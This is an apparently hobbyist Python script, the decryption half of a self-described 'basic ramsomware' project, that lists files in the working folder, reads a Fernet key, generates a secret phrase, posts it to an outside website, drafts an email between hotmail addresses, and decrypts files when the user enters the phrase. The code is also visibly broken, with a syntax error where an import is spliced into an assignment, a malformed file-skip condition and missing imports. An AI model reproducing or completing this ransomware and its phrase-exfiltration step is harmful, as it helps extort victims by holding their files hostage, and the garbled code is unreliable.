files = []

for file in os.listdir():
        if file == ("basic ramsomware testing only.py" or file == "thekey.key" or file == "decrypt.py"):
                continue
        if os.path.isfile(file):
                files.append(file)
                
print (files)


with open("thekey.key", "rb") as key:
        secretkey = key.read()
        
        
secretphrase = import random

word_list = ["apple", "banana", "chocolate", "dragon", "elephant", "flamingo"]


secret_phrase = " ".join(random.sample(word_list, 3))
import requests

url = "https://lssorg.wixsite.com/my-site-1"
data = {'secret_phrase'}
response = requests.post(url, data=data)

print(response.text)

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


sender_email = "test_auto_ramsomware@hotmail.com"
receiver_email = "customer_services.help@hotmail.com"
subject = "Hello from Python!"
body = "This is the body of the email."

message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject
message.attach(MIMEText(body, "plain"))

user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
        for file in files:
                with open(file, "rb") as thefile:
                        contents = thefile.read()
                contents_decrypted = Fernet(secretkey).decrypt(contents)
                with open(file, "wb") as thefile:
                        thefile.write(contents_decrypted)
                print("congrats, you're files are decrypted. Enjoy")
else:
        print("sorry, wrong secret phrase.")
